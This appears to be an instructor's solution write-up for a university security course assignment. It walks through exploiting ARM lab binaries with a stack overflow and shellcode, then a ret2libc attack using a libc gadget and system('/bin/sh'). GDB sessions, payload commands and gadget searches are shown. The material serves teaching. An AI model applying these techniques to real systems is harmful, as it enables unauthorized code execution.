# cs6332-001: assign0x2 solution

## Background


## part{1,2,3}_x86 + part1_arm

As these parts are straightforward, we won't get into details here. For detailed step-by-step solutions, please refer to Evelyn Wang (elw160030)'s [submission](submission_elw160030.pdf).

## [part2_arm]: shellcoding 1-0-1 for ARM

This assignment aims to exercise the following learning objectives. *(1)* [ARM shellcoding] which switches across [ARM][ARM mode] and [Thumb][Thumb mode] modes,*(2)* Understanding on stack framework changes and return address manipulation.

Practically, to finish the assignment, students need to comprehend the following techniques. 

1. Gaining the *absolute* address of current stack pointer (`$sp`, `$r13`) and target entry point for shellcode.
    - For both contexts with and without [GDB][b'Home - GEF - GDB Enhanced Features documentation'].
1. Four-bytes (or two-bytes for Thumb) alignment scheme for ARM architecture.

### Solution

* **[solution script][part2_arm.py]**

#### STEP1: Crafting payload (with GDB)

First, students need to find / construct a [shellcode][ARM shellcoding] snippet and construct the payload to redirect the code execution and run the shellcode. The payload comprises the following components.

[The solution script][part2_arm.py] automates the following process. 

1. Overflow the stack buffer to overwrite a return IP. 
    * With *an absolute* address value to trigger execution to the shellcode.
2. NOP sled to prevent potential errors due minor miscalculation.
    * We can specify arbitary character as the `NOP` (E.g., `\x00`), as ARM architecture simply ignores the byte stream which cannot be decoded. 
    * The target address needs to be *four-byte aligned*. For non-decodable  NOP operation, ARM skips four-bytes at a time. 
3. Shellcode payload.

Setting breakpoints to relevant location to check the stack point.
```gdb
$ gdb part0x02_arm

gef➤  disas vuln

0x000106c4 <+112>:   mov     r0, r3         <---- breakpoint
0x000106c8 <+116>:   bl      0x105ec <readbuf>


0x0001070c <+184>:	sub	sp, r11, #4  <--- breakpoint
0x00010710 <+188>:	pop	{r11, pc}

gef➤ b *0x000106c4
gef➤ b *0x0001070c

run /tmp/part2
```

Craft the payload and run
```bash
# overwrites return PC from stack framework with
# 0xbeffe080, a pontential starting point of shellcode
$ python ~/part2_arm.py --ret_pc  0xbeffe080 --nop_len 8 > /tmp/part2
```

Step through the program execution, to confirms the correctness of the payload.

#### STEP2: Approximating stack frame offset (without GDB)

A simple program to get a stack location.
```c
$ cat test0.c
// gcc -marm -fno-stack-protector -z execstack -o test0 test0.c
#include <stdio.h>
int main(int argc, char* argv[]) {
    int a = 0;
    printf("val: %d, addr: %p \n", a, &a);
    return 0;
}
```

Run `test0` without gdb
```
$ ./test0
val: 0, addr: 0xbefff13c
```

* Run `test0` with gdb
```
$ gdb ./test0
...
gef➤  r
Starting program: /home/kjee/Documents/repos/cs6332.001-f20-assign0x2/binaries/test0
val: 0, addr: 0xbefff0ac
[Inferior 1 (process 28040) exited normally]
gef➤  p/d  0xbefff13c - 0xbefff0ac
$2 = 144
```

Now we have an approximate stack offset (**144 bytes**) with and with gdb.

#### STEP3: Crafting new payload for the attack without GDB

We craft a new payload by approximating different `gdb_offset` value to adjust return PC address for instruction pointer to land and continue execution. To increase the chance for successful execution, we prepend the shellcode with 100 NOP bytes. Please note that ARM follows four-byte fixed width (or two-bytes for Thumb) encoding, please ensure your `ret_pc + gdb_offset` also respects four-byte alignment scheme. Otherwise you will crash the program with *illegal* instruction error.

```shell
# 1st attempt with 144
$ python ~/part2_arm.py --ret_pc  0xbeffe080 --gdb_offset 144 --nop_len 100 > /tmp/part2.nogdb

prefix len: 24
ret PC: 0xbeffe080
gdb_offset: 144
nop_len: 100
$ ./part0x02_arm /tmp/part2.nogdb
CS6332 Crackme Level 0x00
Invalid Password!
[1]    29212 illegal hardware instruction  ./part0x02_arm /tmp/part2.nogdb

# 2nd attempt with 148
$ python ~/part2_arm.py --ret_pc  0xbeffe080 --gdb_offset 148 --nop_len 100 > /tmp/part2.nogdb

prefix len: 24
ret PC: 0xbeffe080
gdb_offset: 148
nop_len: 100
$ ./part0x02_arm /tmp/part2.nogdb
CS6332 Crackme Level 0x00
Invalid Password!
[1]    29265 illegal hardware instruction  ./part0x02_arm /tmp/part2.nogdb

# 3rd attempt with 160
$ python ~/part2_arm.py --ret_pc  0xbeffe080 --gdb_offset 160 --nop_len 100 > /tmp/part2.nogdb

prefix len: 24
ret PC: 0xbeffe080
gdb_offset: 160
nop_len: 100

$ ./part0x02_arm /tmp/part2.nogdb
CS6332 Crackme Level 0x00
Invalid Password!
$       # sucess
```

## [part3_arm]: code re-use attack for ARM (ret2lib)

From this assignment, students will learn how to exploit a binary, in the presence of stack protection ([NX], [DEP]) by re-using the codes mapped into the process's address space, with **fixed** address offsets. 

This assignment aims to exercise the following learning objectives. 
* The understanding of ARM calling convention.
    * ARM, AMD64 (register based) vs. IA32 (stack-based)
* A baby-step Return-Oriented-Programming (ROP)

### [part3_arm] solution

* **[Solution script][part3_arm.py]**

We need to set `$r0` register with `/bin/sh`, the first argument for libc's `system()` function and overwrite stack framework for `ret PC` to point to the address of `system()` function.

#### STEP1: Finding a necessary ROP gadget.

We need a ROP gadget that would update `$r0` and `$pc`. You can disassemble libc library and *grep* to find a necessary instruction.

```bash
$ objdump -d /lib/arm-linux-gnueabihf/libc.so.6 > libc.dis
$ grep -n "r0," libc.dis|grep pc |grep pop
101672:   791fc:        e8bd8011        pop     {r0, r4, pc}
102113:   79878:        e8bd8011        pop     {r0, r4, pc}
202948:   da9e4:        e8bd880f        pop     {r0, r1, r2, r3, fp, pc}
```

Alternatively, you can use [ropper] tools to generate the list of ROP gadgets.

```bash
ropper --file /lib/arm-linux-gnueabihf/libc.so.6 --nocolor > /tmp/ropper.txt
```

Then we can calculate the address of the instruction loaded into the process address space by adding the baseline address of libc library.

```
$ ldd part0x03_arm
        linux-vdso.so.1 (0xb6ffd000)
        /usr/lib/arm-linux-gnueabihf/libarmmem-${PLATFORM}.so => /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so (0xb6fb9000)
        libc.so.6 => /lib/arm-linux-gnueabihf/libc.so.6 (0xb6e6b000)
        /lib/ld-linux-armhf.so.3 (0xb6fce000)

gef➤  p 0xb6e6b000 + 0x791fc
$6 = 0xb6ee41fc
```

### STEP2: Obtaining the address of `system()`

```
gef➤  p system
$5 = {int (const char *)} 0xb6ea39c8 <__libc_system>
```

### STEP3: Seaching for `/bin/sh` string

```
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/lib/arm-linux-gnueabihf/libc-2.28.so'(0xb6e6b000-0xb6fa3000), permission=r-x
  0xb6f96b6c - 0xb6f96b73  →   "/bin/sh"
[+] In (0xb6ff9000-0xb6ffb000), permission=rw-
  0xb6ffa908 - 0xb6ffa90f  →   "/bin/sh"
```

[The solution script][part3_arm.py] generates the payload to construct the following stack layout.

![](/uploads/upload_97c21329ad74e791ff191b5aa39fcc64.png)

## More thoughts

### On the effectiveness of [Address Space Randomization][Address space layout randomization - Wikipedia]

* **Q1:** What are we taking advantage?
    1. Fixed stack segment mapping at run-time.
    2. Fixed *libc* mapping at run-time.

* **Q2:** How can we ALWAYS get stack pointer ($SP or %ESP)?
* **Q3:** What are the memory segments that are still fixed (not randomized)?

### W⊗X memory protection by [NX], [DEP]

* **Q1:** Can we always apply **W$\otimes$X** principle?
* JIT'ed segment for *java*
    ```bash=
    for pid in $(pidof java)
    do
        readlink /proc/$pid/exe
        grep wx /proc/$pid/maps
        echo ""
    done
    ```
----

[Chromium OS Docs - Linux System Call Table]:https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
[Linux/ARM - execve(/bin/sh,NULL,0) - 31 bytes]:http://shell-storm.org/shellcode/files/shellcode-696.php
[Linux/ARM - execve("/bin/sh", NULL, 0) - 34 bytes]:http://shell-storm.org/shellcode/files/shellcode-904.php
[pwntools — pwntools 4.3.0 documentation]:http://docs.pwntools.com/en/stable/
[b'Home - GEF - GDB Enhanced Features documentation']:https://gef.readthedocs.io/en/master/
[Address space layout randomization - Wikipedia]:https://en.wikipedia.org/wiki/Address_space_layout_randomization

[part2_arm]:../binaries/part0x02_arm
[part3_arm]:../binaries/part0x03_arm
[nx]:https://en.wikipedia.org/wiki/NX_bit
[DEP]:https://en.wikipedia.org/wiki/Executable_space_protection
[ARM shellcoding]:https://codimd.syssec.org/s/JcAYdFgf2A
[ARM mode]:https://www.keil.com/support/man/docs/armasm/armasm_dom1359731126163.htm
[Thumb mode]:https://www.keil.com/support/man/docs/armasm/armasm_dom1359731126163.htm
[part2_arm.py]:part2_arm.py
[part3_arm.py]:part3_arm.py

## Resources

* [AMD64 (x86-64) ret2libc][64-bit Linux stack smashing tutorial: Part 2 â Techorganic â Musings from the brainpan]

[64-bit Linux stack smashing tutorial: Part 2 â Techorganic â Musings from the brainpan]:https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/

###### tags: `cs6332`,`teaching`,`assignment`
